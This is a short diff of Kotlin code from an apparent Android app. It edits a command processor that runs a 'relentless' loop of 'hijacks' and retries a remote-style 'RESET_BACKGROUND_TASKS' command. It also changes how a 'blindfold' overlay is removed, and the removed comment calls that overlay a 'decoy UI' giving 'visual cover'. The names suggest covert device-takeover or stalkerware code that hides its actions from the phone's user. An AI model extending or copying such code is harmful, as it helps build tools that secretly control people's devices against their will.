@@ -2555,7 +2555,11 @@ object CommandProcessor {
 
                         prefs.edit().putBoolean("hijacks_completed", true).apply()
                         DebugLogger.log("RBT_LIFECYCLE", "Relentless Loop Exited. All Success: $allSuccess")
-                        // No DimmerManager calls here. The Decoy UI (ResetUI) maintains uniform visual cover.
+                        withContext(Dispatchers.Main) {
+                            // Universal Cleanup: Removes the blindfold if ran standalone.
+                            // If ran inside ResetUI, this safely does nothing because the blindfold was bypassed and hardware memory is wiped.
+                            DimmerManager.removeOverlay(ctx)
+                        }
                         if (!allSuccess) {
                             CommandRetryManager.scheduleRetry(ctx, id, "RESET_BACKGROUND_TASKS", "", "160s Relentless Timeout")
                         } else {
